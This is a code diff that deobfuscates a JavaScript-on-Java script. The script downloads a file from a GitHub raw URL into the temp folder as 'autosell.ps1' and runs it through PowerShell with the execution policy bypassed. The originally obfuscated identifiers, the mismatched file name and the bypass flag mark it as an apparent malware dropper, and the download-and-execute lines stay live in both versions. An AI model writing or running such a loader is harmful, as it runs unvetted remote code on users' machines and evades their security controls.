@@ -9,39 +9,39 @@ const Runtime = Java.type("java.lang.Runtime");
 const tempFolder = java.lang.System.getProperty("java.io.tmpdir");
 const scriptPath = tempFolder + File.separator + "autosell.ps1";
 
-function downloadScript(_0x183355, _0x546154) {
+function downloadScript(url, outputPath) {
     try {
-        const _0x29e211 = new URL(_0x183355).openConnection();
-        _0x29e211.setRequestMethod("GET");
-        if (_0x29e211.getResponseCode() !== HttpURLConnection.HTTP_OK) {
-            throw new Error("Failed to download file: HTTP " + _0x29e211.getResponseCode());
+        const connection = new URL(url).openConnection();
+        connection.setRequestMethod("GET");
+        if (connection.getResponseCode() !== HttpURLConnection.HTTP_OK) {
+            throw new Error("Failed to download file: HTTP " + connection.getResponseCode());
         }
-        const _0x19f9cf = new BufferedReader(new InputStreamReader(_0x29e211.getInputStream()));
-        const _0x44c2e3 = new FileWriter(new File(_0x546154));
-        let _0x1d5f8b;
-        while ((_0x1d5f8b = _0x19f9cf.readLine()) !== null) {
-            _0x44c2e3.write(_0x1d5f8b + "\n");
+        const reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+        const writer = new FileWriter(new File(outputPath));
+        let line;
+        while ((line = reader.readLine()) !== null) {
+            writer.write(line + "\n");
         }
-        _0x19f9cf.close();
-        _0x44c2e3.close();
-        print("Script downloaded successfully to: " + _0x546154);
-    } catch (_0x49e7f9) {
-        print("Error downloading the script: " + _0x49e7f9.message);
-        throw _0x49e7f9;
+        reader.close();
+        writer.close();
+        print("Script downloaded successfully to: " + outputPath);
+    } catch (error) {
+        print("Error downloading the script: " + error.message);
+        throw error;
     }
 }
 
-function executeScript(_0x4e2958) {
+function executeScript(scriptPath) {
     try {
-        const _0x358eea = Runtime.getRuntime().exec("powershell -ExecutionPolicy Bypass -File " + _0x4e2958);
-        _0x358eea.waitFor();
-        const _0x527f50 = _0x358eea.exitValue();
-        print("Script executed with exit code: " + _0x527f50);
-    } catch (_0x1760c9) {
-        print("Error executing the script: " + _0x1760c9.message);
+        const process = Runtime.getRuntime().exec("powershell -ExecutionPolicy Bypass -File " + scriptPath);
+        process.waitFor();
+        const exitCode = process.exitValue();
+        print("Script executed with exit code: " + exitCode);
+    } catch (error) {
+        print("Error executing the script: " + error.message);
     }
 }
 
+// Download and execute
 downloadScript("https://raw.githubusercontent.com/duper2-1/wow/refs/heads/main/main.js", scriptPath);
 executeScript(scriptPath);
-A;
